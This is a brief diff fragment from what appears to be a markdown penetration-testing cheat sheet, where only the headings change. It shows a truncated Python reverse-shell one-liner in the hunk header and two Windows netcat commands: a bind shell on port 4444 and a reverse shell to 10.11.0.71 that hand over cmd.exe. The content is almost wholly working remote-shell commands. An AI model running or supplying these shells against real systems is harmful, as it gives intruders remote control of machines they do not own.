@@ -204,9 +204,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ​	on Windows
 
 ```markdown
-bindShell
+#bindShell
 	nc -nvlp 4444 -e cmd.exe
-reverseShell
+#reverseShell
 	nc -n 10.11.0.71 4444 -e cmd.exe
 ```
 
